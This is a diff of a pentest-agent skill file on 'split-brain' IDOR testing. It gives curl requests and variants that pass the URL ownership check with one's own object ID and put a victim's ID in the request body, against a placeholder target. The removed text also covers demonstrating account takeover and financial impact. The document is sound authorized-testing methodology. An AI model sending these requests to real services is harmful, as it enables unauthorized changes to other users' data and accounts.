@@ -7,286 +7,78 @@ vuln_class: idor
 
 # Split-Brain IDOR Testing
 
-> **`vigil assess kali` audit flags:** use `--technique IDOR` for all split-brain identity probes. Use `--probe-kind payload` for divergence testing, `--probe-kind exploit` for confirmed unauthorized access demonstrations.
->
-> **Named identities (use `--identity`, not hand-pasted tokens).** Split-brain IDOR is inherently a **two-user** test: User A's URL (passes auth) + User B's body (hits B's object). Register each account in the credential store as a named identity (`vigil auth import <key> --identity user_a` / `--identity user_b`) and run every probe through `vigil assess kali exec --identity user_a -- curl ...` instead of inlining `Cookie: session=USER_A_TOKEN`. The identity name is stamped as the probe's `auth_context`, so the depth ledger registers a real **cross-identity** access-control pass — replaying the divergence test under ≥2 distinct identities is exactly what makes access-control depth count.
+A supplement to `agent/skills/idor-testing/SKILL.md` (run that first): when a straight URL-ID swap
+is refused, keep **your** ID in the URL (passes the ownership check) and put the **victim's** ID
+in the body (used for the actual write). The app correctly checks "does this user own X?" on the
+route parameter, then operates on the body ID.
 
 ## When to Activate
 
-- API uses RESTful routes with IDs in the path (`PUT /orders/:orderId`)
-- Request bodies also contain ID fields (`{"_id": "...", "orderId": "..."}`)
-- Application uses a BFF or proxy layer that may route based on URL but forward body to backend
-- MongoDB-backed applications (ObjectId in both route and body is common)
-- Any PUT/PATCH/POST endpoint where both the URL and body reference the same object
+- PUT/PATCH/POST routes carry an ID in the path and the body repeats an ID field.
+- A BFF or proxy routes and authorizes on the URL but forwards the body to the backend.
+- MongoDB-backed apps (ObjectId in route and body is common; Express/Mongoose handlers that
+  spread `req.body` into an update).
+- A response echoes an ID that came from the body rather than the URL.
 
-## Core Concept
+## Mechanics
 
-A split-brain IDOR occurs when:
+- `--technique IDOR`; `--probe-kind payload` for divergence, `replay` for read-backs, `exploit`
+  for a demonstrated cross-user write. `kali exec` also needs `--intent`, `--phase`, `--timeout`.
+- Two named identities are required (identity rules and the `--identity-env` two-identity
+  carrier: idor-testing "Vigil mechanics"). All target traffic goes through
+  `vigil assess kali exec --identity <name> -- curl …`, never a hand-pasted cookie.
+- No second account: `vigil assess classify-payload <your-id> --mutations` surfaces the
+  well-known first/admin IDs (`1`, `00000000-…-000000000001`) for the body; its `format`
+  variants (string vs number, `[id]`, `null`) test whether the guard compares scalars only — a
+  type mismatch can defeat `body._id === req.params.id` while the DB still resolves the object.
 
-1. The URL path contains an object ID (used for routing/authorization checks)
-2. The request body ALSO contains an object ID (used for the actual database operation)
-3. The server validates authorization against the URL ID but operates on the body ID
-4. An attacker supplies their own ID in the URL (passes auth) but a victim's ID in the body (hits victim's object)
+## Divergence tests
 
-This is distinct from standard IDOR because the application may correctly enforce "does this user own object X?" on the URL parameter — but then ignores that check and uses the body parameter for the actual write.
-
-## Tools
-
-- `vigil assess kali exec --identity <name> -- curl ...` for all probing (mandatory audit pipeline; `--identity` selects + stamps the named identity)
-- Two test accounts with distinct object IDs, registered as named identities (`user_a`, `user_b`) in the credential store
-- Mitmproxy or browser DevTools for observing request/response shapes
-
----
-
-## Phase 1: Identify Candidate Endpoints
-
-### 1.1 Find PUT/PATCH Endpoints with Body IDs
-
-Look for patterns where the body repeats an identifier from the URL:
-
-```
-PUT /api/orders/ORDER_A_ID
-Body: {"_id": "ORDER_A_ID", "status": "shipped", ...}
-
-PATCH /api/users/USER_A_ID
-Body: {"id": "USER_A_ID", "email": "new@email.com", ...}
-
-POST /api/projects/PROJ_A_ID/update
-Body: {"projectId": "PROJ_A_ID", "name": "New Name", ...}
-```
-
-**Candidate signals:**
-- [ ] PUT/PATCH endpoint with route param AND body contains `_id`, `id`, `objectId`, `resourceId`
-- [ ] Response echoes back an ID that came from the body (not the URL)
-- [ ] MongoDB ObjectId format (24-char hex) in both URL and body
-- [ ] Application uses Express/Node.js (common pattern in Mongoose/MongoDB apps)
-
-### 1.2 Map ID Field Names
-
-Different applications use different body ID field names:
-
-```
-_id              (MongoDB native)
-id               (Generic REST)
-objectId         (Custom)
-resourceId       (Custom)
-orderId          (Domain-specific)
-userId           (Domain-specific)
-documentId       (Domain-specific)
-entityId         (Generic)
-uuid             (UUID-based)
-pk, primary_key  (Django-style)
-```
-
-### 1.3 Generate the Body-ID Payload Set
-
-You always have your own object's ID and (ideally) the victim's. To probe the divergence
-thoroughly — not just the bare victim ID but case/format/structure confusions that may slip past
-a `body._id === req.params.id` equality check — classify your own ID and reuse its variants in
-the body slot:
+Run the confirmation triad as `user_a`, then read back as `user_b`:
 
 ```bash
-# Mongo ObjectId (24-char hex) → format + boundary confusions to try in the body
-vigil assess classify-payload 6512a1f4e3b9c8a7d2f01b3e --mutations
-#   type: hex
-#   format:   '"6512a1f4e3b9c8a7d2f01b3e"'  '6512a1f4e3b9c8a7d2f01b3e=='  (truncated)  null
-#   boundary: '' 'a' (255×a)
-
-# Numeric or UUID id → escalation variants surface the first/admin object directly
-vigil assess classify-payload 1042 --mutations          # escalation: '1' '0' 'admin' ...
-```
-
-- The **victim's real ID** is your primary body payload (Phase 2) — `classify-payload` cannot
-  guess an opaque value you can only observe, but its `escalation` intent does surface the
-  well-known first/admin object IDs (`1`, `00000000-...-000000000001`) worth trying when you have
-  no second account.
-- The `format` variants (`"id"` as string, `[id]` array, `null`) test whether the server's
-  ID-equality guard only compares scalars — a string-vs-number mismatch can defeat
-  `body._id === req.params.id` while still resolving the same object in the database layer.
-
----
-
-## Phase 2: Divergence Testing
-
-### 2.1 Basic Split-Brain Test
-
-**Setup:** User A owns Object A. User B owns Object B.
-
-All three steps run AS `user_a` (the attacker identity). `--identity user_a` selects user_a's
-auth material and stamps the probe — no hand-pasted `Cookie: session=` token. Steps 2/3 are the
-cross-identity pass (attacker user_a reaching user_b's object).
-
-```bash
-# Step 1: Baseline — user_a updates their own object (should succeed)
-vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
-  curl -X PUT https://target/api/orders/OBJECT_A_ID \
-    -H "Content-Type: application/json" \
-    -d '{"_id": "OBJECT_A_ID", "status": "updated"}'
-# Expected: 200 OK, Object A updated
-
-# Step 2: Standard IDOR test — user_a targets user_b's object via URL
-vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
-  curl -X PUT https://target/api/orders/OBJECT_B_ID \
-    -H "Content-Type: application/json" \
-    -d '{"_id": "OBJECT_B_ID", "status": "updated"}'
-# Expected if IDOR-protected: 403 Forbidden (user_a doesn't own Object B)
-
-# Step 3: SPLIT-BRAIN TEST — user_a's URL (passes auth) + user_b's body (hits B's data)
-vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
-  curl -X PUT https://target/api/orders/OBJECT_A_ID \
-    -H "Content-Type: application/json" \
-    -d '{"_id": "OBJECT_B_ID", "status": "hacked"}'
-# VULNERABLE if: 200 OK and Object B is modified
-# The URL passes ownership check (user_a owns A), but the body ID hits Object B
-```
-
-### 2.2 Variant: Body ID Different from Route ID
-
-Test multiple field names in the body:
-
-```bash
-# Try various body ID field names
-for field in "_id" "id" "objectId" "orderId" "userId" "documentId"; do
-  curl -X PUT https://target/api/orders/OBJECT_A_ID \
-    -H "Cookie: session=USER_A_TOKEN" \
-    -H "Content-Type: application/json" \
-    -d "{\"$field\": \"OBJECT_B_ID\", \"status\": \"test\"}"
+# 1. baseline: matching IDs (works); 2. split-brain: your URL, victim body ID;
+# then read back as the victim, and 3. revert: the owner restores the victim object's value
+for body in '{"_id":"OBJECT_A_ID","status":"probe"}' '{"_id":"OBJECT_B_ID","status":"probe"}'; do
+  vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a \
+    --intent "split-brain body/route divergence" --phase consume-test --timeout 60 -- \
+    curl -s -X PUT -H "Content-Type: application/json" -d "$body" https://target/api/orders/OBJECT_A_ID
 done
+vigil assess kali exec --technique IDOR --probe-kind replay --identity user_b \
+  --intent "read back victim object after split-brain write" --phase consume-test --timeout 60 -- \
+  curl -s https://target/api/orders/OBJECT_B_ID
+vigil assess kali exec --technique IDOR --probe-kind cleanup --identity user_b \
+  --intent "revert victim object after split-brain proof" --phase consume-test --timeout 60 -- \
+  curl -s -X PUT -H "Content-Type: application/json" \
+  -d '{"_id":"OBJECT_B_ID","status":"ORIGINAL_STATUS"}' https://target/api/orders/OBJECT_B_ID
 ```
 
-### 2.3 Variant: Missing Body ID (Fallback Behavior)
+Then vary: every body ID name the app uses (`_id`, `id`, `objectId`, `<domain>Id`, `uuid`, `pk`);
+**add** a body ID where the client normally omits it (the fallback is URL-based, but an added ID
+may override routing); nested sub-object IDs (`customer._id`, `items[]._id`); POST that creates an
+object for or billed to a victim via body `userId`; bulk mixed IDs and GraphQL resolvers that use
+an inner ID (idor-testing, graphql-testing). Sweep sibling verbs and related objects
+(orders → invoices → payments) once one works.
 
-```bash
-# What happens when body ID is omitted?
-curl -X PUT https://target/api/orders/OBJECT_A_ID \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"status": "test"}'
-# Does the server use the URL ID as fallback? If so, normal behavior is URL-based,
-# but including a body ID may override it.
-```
-
-### 2.4 Variant: Nested Object IDs
-
-Some APIs have nested object references:
-
-```bash
-# Nested object override
-curl -X PUT https://target/api/orders/OBJECT_A_ID \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"_id": "OBJECT_A_ID", "customer": {"_id": "VICTIM_CUSTOMER_ID"}, "status": "test"}'
-
-# Array of nested objects with IDs
-curl -X PUT https://target/api/orders/OBJECT_A_ID \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"_id": "OBJECT_A_ID", "items": [{"_id": "VICTIM_ITEM_ID", "quantity": 0}]}'
-```
-
----
-
-## Phase 3: Confirm Impact
-
-### 3.1 Verify the Write Landed on Victim's Object
-
-```bash
-# As user_b (the victim), check if their object was modified
-vigil assess kali exec --technique IDOR --probe-kind payload --identity user_b -- \
-  curl https://target/api/orders/OBJECT_B_ID
-# If status shows "hacked" → confirmed write to victim's object
-
-# Or as user_a, if the endpoint allows reading by ID:
-vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
-  curl https://target/api/orders/OBJECT_B_ID
-```
-
-### 3.2 Demonstrate Meaningful Impact
-
-Don't stop at "I changed a status field." Demonstrate:
-
-- [ ] **Data theft**: Read victim's sensitive fields by triggering a response that includes them
-- [ ] **Account takeover**: Change victim's email/password via body ID override
-- [ ] **Financial impact**: Modify order amounts, transfer ownership, change payment details
-- [ ] **Privilege escalation**: Change victim's role field to elevate attacker's access
-
-### 3.3 Scale Check
-
-- [ ] Does the vulnerability work across all objects of this type?
-- [ ] Does it work on other endpoint types (PATCH, DELETE)?
-- [ ] Does it work on related objects (orders → invoices → payments)?
-
----
-
-## Phase 4: Advanced Variants
-
-### 4.1 Create Operations (POST)
-
-```bash
-# POST that creates an object "for" another user
-curl -X POST https://target/api/orders \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"userId": "VICTIM_USER_ID", "items": [...], "total": 0}'
-# Creates an order owned by the victim? Or billed to the victim?
-```
-
-### 4.2 Bulk Operations
-
-```bash
-# Bulk update with mixed IDs
-curl -X PATCH https://target/api/orders/bulk \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"ids": ["OBJECT_A_ID", "OBJECT_B_ID"], "status": "cancelled"}'
-```
-
-### 4.3 GraphQL Mutations
-
-```graphql
-mutation {
-  updateOrder(id: "OBJECT_A_ID") {  # Auth check on this ID
-    id
-    status
-  }
-}
-# But the resolver uses a different field internally
-```
-
----
+Impact and severity follow `agent/references/finding-fp-and-severity-gate.md`: show the victim's
+object changed (read back as the victim) and what that enables (sensitive read, email/password
+change, financial or role field). A divergence that only touches your own data is not a finding.
 
 ## What to Record
 
-- Endpoint (method + path) and the specific body field that overrides the route parameter
-- The authorization model: what the route ID checked vs what the body ID accessed
-- Proof of cross-user impact: show Object B was modified while authenticated as User A
-- Verify the URL-based auth check passes (this is what makes it a split-brain, not just a standard IDOR)
-- Attacker outcome: what data was accessed/modified on the victim's object
-- Severity:
-  - **Critical**: Body ID override enables account takeover (email/password change on victim)
-  - **High**: Body ID override enables reading/modifying victim's sensitive data (PII, financial)
-  - **Medium**: Body ID override enables modifying non-sensitive fields on victim's objects
-  - **Low**: Divergence confirmed but no meaningful cross-user impact (e.g., only affects own data shape)
+The body field that overrides the route parameter, proof the URL-based check passed (that is what
+makes it split-brain rather than plain IDOR), the victim object before/after, and the identities
+that ran each step. Format: `agent/references/runtime-guides/web-finding-recording.md`.
 
-## Kill Signals — Stop Testing When
+## Kill Signals
 
-- Body ID and URL ID must match (server validates `body._id === req.params.id`) → no divergence possible
-- Body ID is ignored entirely (removing it produces identical behavior) → server uses URL ID only
-- Body ID override produces a 400 or validation error mentioning "ID mismatch" → explicitly checked
-- Standard IDOR test (Step 2) already succeeds → this is a regular IDOR, not a split-brain variant
+- The server requires `body._id === req.params.id`, or returns a 400 naming an ID mismatch.
+- Removing the body ID changes nothing (URL ID only).
+- A straight URL swap already works: it is regular IDOR.
 
 ## Escalate When
 
-- URL auth check passes but body ID hits a different object → confirmed split-brain, test all PUT/PATCH endpoints
-- Same pattern exists on user-profile or account-settings endpoints → account takeover vector
-- The application uses a shared middleware pattern (same BFF proxy for all endpoints) → the vulnerability likely exists on EVERY endpoint that accepts body IDs
-- Nested object IDs inside arrays are also affected → batch manipulation of victim's sub-resources
-
-## Relationship to Standard IDOR Testing
-
-This skill is a **supplement** to `idor-testing/SKILL.md`, not a replacement. Run standard IDOR tests first. If standard IDOR is blocked (server returns 403 when you change the URL ID), THEN test split-brain: keep your own ID in the URL but put the victim's ID in the body.
-
-## Extended Resources
-
-- `agent/references/api-security/API01-broken-object-level-authz.md` — OWASP BOLA context
-- `agent/skills/idor-testing/SKILL.md` — Standard IDOR methodology (run first)
+- Profile/account-settings endpoints share the pattern → account takeover vector.
+- A shared middleware/BFF fronts every endpoint → the flaw likely exists on every endpoint that
+  accepts body IDs; sweep them.
+- Nested array IDs are affected → batch manipulation of a victim's sub-resources.
